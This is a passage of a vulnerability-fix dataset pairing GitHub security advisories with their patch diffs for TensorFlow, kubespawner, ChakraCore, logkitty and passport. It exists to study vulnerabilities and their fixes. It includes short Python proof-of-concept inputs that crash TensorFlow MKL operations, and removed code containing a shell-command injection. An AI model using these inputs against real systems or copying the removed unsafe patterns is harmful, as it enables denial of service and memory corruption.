Security","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/578e634b4f1c1c684d4b4294f9e5281b2133b3ed","commit_sha":"578e634b4f1c1c684d4b4294f9e5281b2133b3ed","patch":"SINGLE","chain_ord":"['578e634b4f1c1c684d4b4294f9e5281b2133b3ed']","before_first_fix_commit":"{'d7de67733925de196ec8863a33445b73f9562d1d'}","last_fix_commit":"578e634b4f1c1c684d4b4294f9e5281b2133b3ed","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 05:24:08","message":"Prevent a segfault in shape inference due to bad inputs.\n\nPiperOrigin-RevId: 387737970\nChange-Id: Ibd1cf3dbdce1dd2ab47fd633d5c5a57f7d8fb6e9","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'tensorflow\/core\/ops\/sparse_ops.cc': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/578e634b4f1c1c684d4b4294f9e5281b2133b3ed\/tensorflow%2Fcore%2Fops%2Fsparse_ops.cc', 'patch': '@@ -16,6 +16,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/common_shape_fns.h\"\\n #include \"tensorflow\/core\/framework\/op.h\"\\n #include \"tensorflow\/core\/framework\/shape_inference.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n \\n namespace tensorflow {\\n \\n@@ -619,6 +620,8 @@ REGISTER_OP(\"SparseFillEmptyRows\")\\n       DimensionHandle unused_dim;\\n       TF_RETURN_IF_ERROR(c->Merge(c->Dim(input_indices, 1),\\n                                   c->Dim(input_shape, 0), &unused_dim));\\n+      if (c->Value(c->NumElements(input_shape)) == 0)\\n+        return errors::InvalidArgument(\"dense_shape must not be empty\");\\n       ShapeHandle output_indices =\\n           c->Matrix(InferenceContext::kUnknownDim, c->NumElements(input_shape));\\n       ShapeHandle output_values = c->Vector(InferenceContext::kUnknownDim);'}}","message_norm":"prevent a segfault in shape inference due to bad inputs.\n\npiperorigin-revid: 387737970\nchange-id: ibd1cf3dbdce1dd2ab47fd633d5c5a57f7d8fb6e9","language":"en","entities":"[('prevent', 'ACTION', ''), ('segfault', 'SECWORD', ''), ('387737970', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/ops\/sparse_ops.cc'])","num_files":1.0},{"index":3071,"vuln_id":"GHSA-v7m9-9497-p9gr","cwe_id":"{'CWE-863'}","score":6.8,"chain":"{'https:\/\/github.com\/jupyterhub\/kubespawner\/commit\/3dfe870a7f5e98e2e398b01996ca6b8eff4bb1d0'}","dataset":"osv","summary":"Possible pod name collisions in jupyterhub-kubespawner ### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nJupyterHub deployments using:\n\n- KubeSpawner <= 0.11.1 (e.g. zero-to-jupyterhub 0.9.0) and\n- enabled named_servers (not default), and\n- an Authenticator that allows:\n  - usernames with hyphens or other characters that require escape (e.g. `user-hyphen` or `user@email`), and\n  - usernames which may match other usernames up to but not including the escaped character (e.g. `user` in the above cases)\n\nIn this circumstance, certain usernames will be able to craft particular server names which will grant them access to the default server of other users who have matching usernames.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nPatch will be released in kubespawner 0.12 and zero-to-jupyterhub 0.9.1\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n#### KubeSpawner\n\nSpecify configuration:\n\nfor KubeSpawner\n```python\nfrom traitlets import default\nfrom kubespawner import KubeSpawner\n\nclass PatchedKubeSpawner(KubeSpawner):\n    @default(\"pod_name_template\")\n    def _default_pod_name_template(self):\n        if self.name:\n            return \"jupyter-{username}-{servername}\"\n        else:\n            return \"jupyter-{username}\"\n\n    @default(\"pvc_name_template\")\n    def _default_pvc_name_template(self):\n        if self.name:\n            return \"claim-{username}-{servername}\"\n        else:\n            return \"claim-{username}\"\n\nc.JupyterHub.spawner_class = PatchedKubeSpawner\n```\n\n**Note for KubeSpawner:** this configuration will behave differently before and after the upgrade, so will need to be removed when upgrading. Only apply this configuration while still using KubeSpawner \u2264 0.11.1 and remove it after upgrade to ensure consistent pod and pvc naming.\n\nChanging the name template means pvcs for named servers will have different names. This will result in orphaned PVCs for named servers across Hub upgrade! This may appear as data loss for users, depending on configuration, but the orphaned PVCs will still be around and data can be migrated manually (or new PVCs created manually to reference existing PVs) before deleting the old PVCs and\/or PVs.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [kubespawner](https:\/\/github.com\/jupyterhub\/kubespawner)\n* Email us at [security@ipython.org](mailto:security@ipython.org)\n\nCredit: Jining Huang","published_date":"2020-07-22","chain_len":1,"project":"https:\/\/github.com\/jupyterhub\/kubespawner","commit_href":"https:\/\/github.com\/jupyterhub\/kubespawner\/commit\/3dfe870a7f5e98e2e398b01996ca6b8eff4bb1d0","commit_sha":"3dfe870a7f5e98e2e398b01996ca6b8eff4bb1d0","patch":"SINGLE","chain_ord":"['3dfe870a7f5e98e2e398b01996ca6b8eff4bb1d0']","before_first_fix_commit":"{'b7f55eae3d5afb6ac9f2facf76f46239e2f2a38a'}","last_fix_commit":"3dfe870a7f5e98e2e398b01996ca6b8eff4bb1d0","chain_ord_pos":1.0,"commit_datetime":"07\/03\/2020, 07:48:42","message":"move delimiter to pvc\/pod name templates\n\nand note version change","author":"Min RK","comments":null,"stats":"{'additions': 28, 'deletions': 16, 'total': 44}","files":"{'kubespawner\/spawner.py': {'additions': 28, 'deletions': 16, 'changes': 44, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jupyterhub\/kubespawner\/raw\/3dfe870a7f5e98e2e398b01996ca6b8eff4bb1d0\/kubespawner%2Fspawner.py', 'patch': '@@ -307,16 +307,25 @@ def _namespace_default(self):\\n     )\\n \\n     pod_name_template = Unicode(\\n-        \\'jupyter-{username}{servername}\\',\\n+        \\'jupyter-{username}--{servername}\\',\\n         config=True,\\n         help=\"\"\"\\n         Template to use to form the name of user\\'s pods.\\n \\n-        `{username}` is expanded to the escaped, dns-label safe username.\\n+        `{username}` is expanded to the escaped, dns-label-safe username.\\n+        `{servername}` is expanded to the escaped, dns-label-safe server name, if any.\\n+\\n+        Trailing `-` characters are stripped for safe handling of empty server names (user default servers).\\n \\n         This must be unique within the namespace the pods are being spawned\\n         in, so if you are running multiple jupyterhubs spawning in the\\n         same namespace, consider setting this to be something more unique.\\n+\\n+        .. versionchanged:: 0.12\\n+            `--` delimiter added to the template,\\n+            where it was implicitly added to the `servername` field before.\\n+            Additionally, `username--servername` delimiter was `-` instead of `--`,\\n+            allowing collisions in certain circumstances.\\n         \"\"\"\\n     )\\n \\n@@ -332,16 +341,25 @@ def _namespace_default(self):\\n     )\\n \\n     pvc_name_template = Unicode(\\n-        \\'claim-{username}{servername}\\',\\n+        \\'claim-{username}--{servername}\\',\\n         config=True,\\n         help=\"\"\"\\n         Template to use to form the name of user\\'s pvc.\\n \\n         `{username}` is expanded to the escaped, dns-label safe username.\\n+        `{servername}` is expanded to the escaped, dns-label-safe server name, if any.\\n+\\n+        Trailing `-` characters are stripped for safe handling of empty server names (user default servers).\\n \\n         This must be unique within the namespace the pvc are being spawned\\n         in, so if you are running multiple jupyterhubs spawning in the\\n         same namespace, consider setting this to be something more unique.\\n+\\n+        .. versionchanged:: 0.12\\n+            `--` delimiter added to the template,\\n+            where it was implicitly added to the `servername` field before.\\n+            Additionally, `username--servername` delimiter was `-` instead of `--`,\\n+            allowing collisions in certain circumstances.\\n         \"\"\"\\n     )\\n \\n@@ -1313,28 +1331,22 @@ def _expand_user_properties(self, template):\\n         # Note: \\'-\\' is not in safe_chars, as it is being used as escape character\\n         safe_chars = set(string.ascii_lowercase + string.digits)\\n \\n-        # Set servername based on whether named-server initialised\\n-        if self.name:\\n-            # use two -- to ensure no collision possibilities\\n-            # are created by an ambiguous boundary between username and\\n-            # servername.\\n-            # -- cannot occur in a string where - is the escape char.\\n-            servername = \\'--{}\\'.format(self.name)\\n-            safe_servername = \\'--{}\\'.format(escapism.escape(self.name, safe=safe_chars, escape_char=\\'-\\').lower())\\n-        else:\\n-            servername = \\'\\'\\n-            safe_servername = \\'\\'\\n+        raw_servername = self.name or \\'\\'\\n+        safe_servername = escapism.escape(raw_servername, safe=safe_chars, escape_char=\\'-\\').lower()\\n \\n         legacy_escaped_username = \\'\\'.join([s if s in safe_chars else \\'-\\' for s in self.user.name.lower()])\\n         safe_username = escapism.escape(self.user.name, safe=safe_chars, escape_char=\\'-\\').lower()\\n-        return template.format(\\n+        rendered = template.format(\\n             userid=self.user.id,\\n             username=safe_username,\\n             unescaped_username=self.user.name,\\n             legacy_escape_username=legacy_escaped_username,\\n             servername=safe_servername,\\n-            unescaped_servername=servername,\\n+            unescaped_servername=raw_servername,\\n         )\\n+        # strip trailing - delimiter in case of empty servername.\\n+        # k8s object names cannot have trailing -\\n+        return rendered.rstrip(\"-\")\\n \\n     def _expand_all(self, src):\\n         if isinstance(src, list):'}}","message_norm":"move delimiter to pvc\/pod name templates\n\nand note version change","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['kubespawner\/spawner.py'])","num_files":1.0},{"index":3074,"vuln_id":"GHSA-v82p-hv3v-p6qp","cwe_id":"{'CWE-20'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/203214568f5bc237603dbab6e1fd389f1572f5c9', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e62869465573cb2d9b5053f1fa02a81fce21d69'}","dataset":"osv","summary":"Incomplete validation in MKL requantization ### Impact\nDue to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RequantizationRangePerChannel(\n  input=[],\n  input_min=[0,0,0,0,0],\n  input_max=[1,1,1,1,1],\n  clip_value_max=1)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/mkl\/mkl_requantization_range_per_channel_op.cc) does not validate the dimensions of the `input` tensor.\n\nA similar issue occurs in `MklRequantizePerChannelOp`:\n\n```python\nimport tensorflow as tf \nfrom tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  out_type=tf.int)\n``` \n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/mkl\/mkl_requantize_per_channel_op.cc) does not perform full validation for all the input arguments.\n\n### Patches\nWe have patched the issue in GitHub commit [9e62869465573cb2d9b5053f1fa02a81fce21d69](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e62869465573cb2d9b5053f1fa02a81fce21d69) and in the Github commit [203214568f5bc237603dbab6e1fd389f1572f5c9](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/203214568f5bc237603dbab6e1fd389f1572f5c9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/203214568f5bc237603dbab6e1fd389f1572f5c9","commit_sha":"203214568f5bc237603dbab6e1fd389f1572f5c9","patch":"MULTI","chain_ord":"['9e62869465573cb2d9b5053f1fa02a81fce21d69', '203214568f5bc237603dbab6e1fd389f1572f5c9']","before_first_fix_commit":"{'aff0d5b2883ea3de9b52f9e7cd996a34b299bf06'}","last_fix_commit":"203214568f5bc237603dbab6e1fd389f1572f5c9","chain_ord_pos":2.0,"commit_datetime":"07\/30\/2021, 23:06:23","message":"Reorganize and add more validation to MKL requantization\n\nPiperOrigin-RevId: 387901341\nChange-Id: I2515b9034c64e113db0bcec8337d30643ab0a0f1","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 25, 'deletions': 15, 'total': 40}","files":"{'tensorflow\/core\/kernels\/mkl\/mkl_requantize_per_channel_op.cc': {'additions': 25, 'deletions': 15, 'changes': 40, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/203214568f5bc237603dbab6e1fd389f1572f5c9\/tensorflow%2Fcore%2Fkernels%2Fmkl%2Fmkl_requantize_per_channel_op.cc', 'patch': '@@ -49,35 +49,45 @@ class MklRequantizePerChannelOp : public OpKernel {\\n   void Compute(OpKernelContext* ctx) override {\\n     try {\\n       const Tensor& input = ctx->input(kInputTensorIndex);\\n+      OP_REQUIRES(\\n+          ctx, input.dims() == 4,\\n+          errors::InvalidArgument(\"Current RequantizePerChannel operator\"\\n+                                  \"supports 4D tensors only.\"));\\n+\\n       const Tensor& input_min_vec = ctx->input(kInputMinVecIndex);\\n+      size_t depth = input_min_vec.NumElements();\\n       float* input_min_vec_data = (float*)const_cast<void*>(\\n           static_cast<const void*>(input_min_vec.flat<float>().data()));\\n+\\n       const Tensor& input_max_vec = ctx->input(kInputMaxVecIndex);\\n+      OP_REQUIRES(\\n+          ctx, input_max_vec.NumElements() == depth,\\n+          errors::InvalidArgument(\"input_max has incorrect size, expected \",\\n+                                  depth, \" was \", input_max_vec.NumElements()));\\n       float* input_max_vec_data = (float*)const_cast<void*>(\\n           static_cast<const void*>(input_max_vec.flat<float>().data()));\\n \\n       const Tensor& input_requested_min = ctx->input(this->kRequestMinIndex);\\n+      OP_REQUIRES(\\n+          ctx, input_requested_min.NumElements() == 1,\\n+          errors::InvalidArgument(\"requested_output_min must be a scalar\"));\\n       const float input_requested_min_float =\\n           input_requested_min.flat<float>()(0);\\n+\\n       const Tensor& input_requested_max = ctx->input(this->kRequestMaxIndex);\\n+      OP_REQUIRES(\\n+          ctx, input_requested_min.NumElements() == 1,\\n+          errors::InvalidArgument(\"requested_output_max must be a scalar\"));\\n       const float input_requested_max_float =\\n           input_requested_max.flat<float>()(0);\\n \\n-      size_t depth = input_min_vec.NumElements();\\n-      OP_REQUIRES(\\n-          ctx, input.dims() == 4,\\n-          errors::InvalidArgument(\"Current RequantizePerChannel operator\"\\n-                                  \"supports 4D tensors only.\"));\\n-      OP_REQUIRES(\\n-          ctx, input_min_vec.dim_size(0) == depth,\\n-          errors::InvalidArgument(\"input_min has incorrect size, expected \",\\n-                                  depth, \" was \", input_min_vec.dim_size(0)));\\n-      OP_REQUIRES(\\n-          ctx, input_max_vec.dim_size(0) == depth,\\n-          errors::InvalidArgument(\"input_max has incorrect size, expected \",\\n-                                  depth, \" was \", input_max_vec.dim_size(0)));\\n-\\n-      if (out_type_ == DT_QINT8) DCHECK(input_requested_min_float < 0.0f);\\n+      if (out_type_ == DT_QINT8) {\\n+        OP_REQUIRES(ctx, input_requested_min_float < 0.0f,\\n+                    errors::InvalidArgument(\\n+                        \"If out_type is QINT8, requested_output_max must be \"\\n+                        \"non negative, got \",\\n+                        input_requested_min_float));\\n+      }\\n \\n       const float factor = (out_type_ == DT_QINT8) ? 127.0f : 255.0f;\\n       const float requested_min_max ='}}","message_norm":"reorganize and add more validation to mkl requantization\n\npiperorigin-revid: 387901341\nchange-id: i2515b9034c64e113db0bcec8337d30643ab0a0f1","language":"en","entities":"[('add', 'ACTION', ''), ('387901341', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/mkl\/mkl_requantize_per_channel_op.cc'])","num_files":1.0},{"index":3075,"vuln_id":"GHSA-v82p-hv3v-p6qp","cwe_id":"{'CWE-20'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/203214568f5bc237603dbab6e1fd389f1572f5c9', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e62869465573cb2d9b5053f1fa02a81fce21d69'}","dataset":"osv","summary":"Incomplete validation in MKL requantization ### Impact\nDue to incomplete validation in MKL implementation of requantization, an  attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RequantizationRangePerChannel(\n  input=[],\n  input_min=[0,0,0,0,0],\n  input_max=[1,1,1,1,1],\n  clip_value_max=1)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/mkl\/mkl_requantization_range_per_channel_op.cc) does not validate the dimensions of the `input` tensor.\n\nA similar issue occurs in `MklRequantizePerChannelOp`:\n\n```python\nimport tensorflow as tf \nfrom tensorflow.python.ops import gen_math_ops\n\ngen_math_ops.requantize_per_channel(\n  input=[],\n  input_min=[-100,-100,-100,-100,-100],\n  input_max=[-100,-100,-100],\n  requested_output_min=[-100,-100,-100,-100,-100],\n  requested_output_max=[],\n  out_type=tf.int)\n``` \n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/mkl\/mkl_requantize_per_channel_op.cc) does not perform full validation for all the input arguments.\n\n### Patches\nWe have patched the issue in GitHub commit [9e62869465573cb2d9b5053f1fa02a81fce21d69](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e62869465573cb2d9b5053f1fa02a81fce21d69) and in the Github commit [203214568f5bc237603dbab6e1fd389f1572f5c9](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/203214568f5bc237603dbab6e1fd389f1572f5c9).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/9e62869465573cb2d9b5053f1fa02a81fce21d69","commit_sha":"9e62869465573cb2d9b5053f1fa02a81fce21d69","patch":"MULTI","chain_ord":"['9e62869465573cb2d9b5053f1fa02a81fce21d69', '203214568f5bc237603dbab6e1fd389f1572f5c9']","before_first_fix_commit":"{'aff0d5b2883ea3de9b52f9e7cd996a34b299bf06'}","last_fix_commit":"203214568f5bc237603dbab6e1fd389f1572f5c9","chain_ord_pos":1.0,"commit_datetime":"07\/29\/2021, 23:29:20","message":"Add more validation to `RequantizationRangePerChannel`.\n\nPiperOrigin-RevId: 387693946\nChange-Id: Ife8dcbdb021bec4787eef6a4361dd08f17c14bd6","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 14, 'deletions': 0, 'total': 14}","files":"{'tensorflow\/core\/kernels\/mkl\/mkl_requantization_range_per_channel_op.cc': {'additions': 14, 'deletions': 0, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/9e62869465573cb2d9b5053f1fa02a81fce21d69\/tensorflow%2Fcore%2Fkernels%2Fmkl%2Fmkl_requantization_range_per_channel_op.cc', 'patch': '@@ -57,6 +57,20 @@ class MklRequantizationRangePerChannelOp : public OpKernel {\\n         ctx, input_max.dim_size(0) == depth,\\n         errors::InvalidArgument(\"input_max has incorrect size, expected \",\\n                                 depth, \" was \", input_max.dim_size(0)));\\n+    OP_REQUIRES(\\n+        ctx, input_min.NumElements() == depth,\\n+        errors::InvalidArgument(\"input_min must have the same number of \"\\n+                                \"elements as input_max, got \",\\n+                                input_min.NumElements(), \" and \", depth));\\n+    OP_REQUIRES(ctx, input.NumElements() > 0,\\n+                errors::InvalidArgument(\"input must not be empty\"));\\n+    OP_REQUIRES(ctx, input.dims() == 4,\\n+                errors::InvalidArgument(\"input must be in NHWC format\"));\\n+    OP_REQUIRES(\\n+        ctx, input.dim_size(3) == depth,\\n+        errors::InvalidArgument(\\n+            \"input must have same number of channels as length of input_min: \",\\n+            input.dim_size(3), \" vs \", depth));\\n \\n     const float* input_min_data = input_min.flat<float>().data();\\n     const float* input_max_data = input_max.flat<float>().data();'}}","message_norm":"add more validation to `requantizationrangeperchannel`.\n\npiperorigin-revid: 387693946\nchange-id: ife8dcbdb021bec4787eef6a4361dd08f17c14bd6","language":"en","entities":"[('add', 'ACTION', ''), ('387693946', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/mkl\/mkl_requantization_range_per_channel_op.cc'])","num_files":1.0},{"index":3080,"vuln_id":"GHSA-v89p-5hr2-4rh4","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/6b1250b6ffea7006226dd937e52cf5b353fcfc15', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-1131, CVE-2019-1139, CVE-2019-1140, CVE-2019-1141, CVE-2019-1195, CVE-2019-1196.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb","commit_sha":"bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb","patch":"MULTI","chain_ord":"['bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb', '6b1250b6ffea7006226dd937e52cf5b353fcfc15']","before_first_fix_commit":"{'75162b7f2d8ac2b37d17564e9c979ba1bae707e8', '450a349fda1b153d758a9e01698b977e60870e4c'}","last_fix_commit":"6b1250b6ffea7006226dd937e52cf5b353fcfc15","chain_ord_pos":1.0,"commit_datetime":"07\/02\/2019, 19:08:32","message":"[CVE-2019-1197] Chakra JIT Type Confusion","author":"Michael Holman","comments":null,"stats":"{'additions': 11, 'deletions': 4, 'total': 15}","files":"{'lib\/Backend\/GlobOptIntBounds.cpp': {'additions': 11, 'deletions': 4, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/bf52b6cfa96d6395046d0aaf87396cd7ca13f6cb\/lib%2FBackend%2FGlobOptIntBounds.cpp', 'patch': '@@ -1278,13 +1278,20 @@ GlobOpt::InvalidateInductionVariables(IR::Instr * instr)\\n     }\\n \\n     \/\/ If this is an induction variable, then treat it the way the prepass would have if it had seen\\n-    \/\/ the assignment and the resulting change to the value number, and mark it as indeterminate.\\n+    \/\/ the assignment and the resulting change to the value number, and mark induction variables\\n+    \/\/ for the loop as indeterminate.\\n+    \/\/ We need to invalidate all induction variables for the loop, because we might have used the\\n+    \/\/ invalidated induction variable to calculate the loopCount, and this now invalid loopCount\\n+    \/\/ also impacts bound checks for secondary induction variables\\n     for (Loop * loop = this->currentBlock->loop; loop; loop = loop->parent)\\n     {\\n-        InductionVariable *iv = nullptr;\\n-        if (loop->inductionVariables && loop->inductionVariables->TryGetReference(dstSym->m_id, &iv))\\n+        if (loop->inductionVariables && loop->inductionVariables->ContainsKey(dstSym->m_id))\\n         {\\n-            iv->SetChangeIsIndeterminate();\\n+            for (auto it = loop->inductionVariables->GetIterator(); it.IsValid(); it.MoveNext())\\n+            {\\n+                InductionVariable& inductionVariable = it.CurrentValueReference();\\n+                inductionVariable.SetChangeIsIndeterminate();\\n+            }\\n         }\\n     }\\n }'}}","message_norm":"[cve-2019-1197] chakra jit type confusion","language":"en","entities":"[('cve-2019-1197', 'VULNID', 'CVE'), ('type confusion', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/GlobOptIntBounds.cpp'])","num_files":1.0},{"index":3081,"vuln_id":"GHSA-v8v8-6859-qxm4","cwe_id":"{'CWE-94'}","score":0.0,"chain":"{'https:\/\/github.com\/zamotany\/logkitty\/commit\/ef2f673e25c629544dd3de6429999318447dd6bf'}","dataset":"osv","summary":"Arbitrary shell command execution in logkitty Lack of output sanitization allowed an attack to execute arbitrary shell commands via the logkitty npm package before version 0.7.1.","published_date":"2020-06-05","chain_len":1,"project":"https:\/\/github.com\/zamotany\/logkitty","commit_href":"https:\/\/github.com\/zamotany\/logkitty\/commit\/ef2f673e25c629544dd3de6429999318447dd6bf","commit_sha":"ef2f673e25c629544dd3de6429999318447dd6bf","patch":"SINGLE","chain_ord":"['ef2f673e25c629544dd3de6429999318447dd6bf']","before_first_fix_commit":"{'e1e229687472d8c9266d17f2969ff7431a78db86'}","last_fix_commit":"ef2f673e25c629544dd3de6429999318447dd6bf","chain_ord_pos":1.0,"commit_datetime":"04\/07\/2020, 09:35:09","message":"huntr - Command Injection Fix (#18)\n\nCo-authored-by: jammy <jammy@loves.shib.es>\r\nCo-authored-by: Pawe\u0142 Trys\u0142a <zamotany@users.noreply.github.com>","author":"huntr-helper","comments":null,"stats":"{'additions': 9, 'deletions': 6, 'total': 15}","files":"{'src\/android\/adb.ts': {'additions': 9, 'deletions': 6, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/zamotany\/logkitty\/raw\/ef2f673e25c629544dd3de6429999318447dd6bf\/src%2Fandroid%2Fadb.ts', 'patch': \"@@ -1,4 +1,4 @@\\n-import { spawn, execSync, ChildProcess } from 'child_process';\\n+import { spawn, execFileSync, ChildProcess } from 'child_process';\\n import path from 'path';\\n import {\\n   CodeError,\\n@@ -25,7 +25,7 @@ export function getAdbPath(customPath?: string): string {\\n \\n export function spawnLogcatProcess(adbPath: string): ChildProcess {\\n   try {\\n-    execSync(`${adbPath} logcat -c`);\\n+    execFileSync(adbPath, ['logcat', '-c']);\\n   } catch (error) {\\n     throw new CodeError(\\n       ERR_ANDROID_CANNOT_CLEAN_LOGCAT_BUFFER,\\n@@ -49,11 +49,14 @@ export function getApplicationPid(\\n   applicationId: string,\\n   adbPath?: string\\n ): number {\\n-  let output: Buffer | undefined;\\n+  let output: Buffer | String | undefined;\\n   try {\\n-    output = execSync(\\n-      `'${getAdbPath(adbPath)}' shell pidof -s ${applicationId}`\\n-    );\\n+    output = execFileSync(getAdbPath(adbPath), [\\n+      'shell',\\n+      'pidof',\\n+      '-s',\\n+      applicationId,\\n+    ]);\\n   } catch (error) {\\n     throw new CodeError(\\n       ERR_ANDROID_CANNOT_GET_APP_PID,\"}}","message_norm":"huntr - command injection fix (#18)\n\nco-authored-by: jammy <jammy@loves.shib.es>\r\nco-authored-by: pawe\u0142 trys\u0142a <zamotany@users.noreply.github.com>","language":"en","entities":"[('command injection', 'SECWORD', ''), ('#18', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/android\/adb.ts'])","num_files":1.0},{"index":3082,"vuln_id":"GHSA-v923-w3x8-wh69","cwe_id":"{'CWE-384'}","score":4.8,"chain":"{'https:\/\/github.com\/jaredhanson\/passport\/commit\/7e9b9cf4d7be02428e963fc729496a45baeea608'}","dataset":"osv","summary":"Passport before 0.6.0 vulnerable to session regeneration when a users logs in or out This affects the package passport before 0.6.0. When a user logs in or logs out, the session is regenerated instead of being closed.","published_date":"2022-07-02","chain_len":1,"project":"https:\/\/github.com\/jaredhanson\/passport","commit_href":"https:\/\/github.com\/jaredhanson\/passport\/commit\/7e9b9cf4d7be02428e963fc729496a45baeea608","commit_sha":"7e9b9cf4d7be02428e963fc729496a45baeea608","patch":"SINGLE","chain_ord":"['7e9b9cf4d7be02428e963fc729496a45baeea608']","before_first_fix_commit":"{'5e6d92f1ef2adf21b54492cc86a7c066ef3f1e98'}","last_fix_commit":"7e9b9cf4d7be02428e963fc729496a45baeea608","chain_ord_pos":1.0,"commit_datetime":"05\/17\/2022, 15:15:54","message":"Regenerate session on login.","author":"Jared Hanson","comments":null,"stats":"{'additions': 20, 'deletions': 10, 'total': 30}","files":"{'lib\/sessionmanager.js': {'additions': 20, 'deletions': 10, 'changes': 30, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jaredhanson\/passport\/raw\/7e9b9cf4d7be02428e963fc729496a45baeea608\/lib%2Fsessionmanager.js', 'patch': \"@@ -10,24 +10,34 @@ function SessionManager(options, serializeUser) {\\n }\\n \\n SessionManager.prototype.logIn = function(req, user, cb) {\\n+  console.log('SM: logIn');\\n+  \\n   var self = this;\\n-  this._serializeUser(user, req, function(err, obj) {\\n+  req.session.regenerate(function(err) {\\n     if (err) {\\n       return cb(err);\\n     }\\n-    \/\/ TODO: Error if session isn't available here.\\n-    if (!req.session) {\\n-      req.session = {};\\n-    }\\n-    if (!req.session[self._key]) {\\n-      req.session[self._key] = {};\\n-    }\\n-    req.session[self._key].user = obj;\\n-    cb();\\n+    \\n+    self._serializeUser(user, req, function(err, obj) 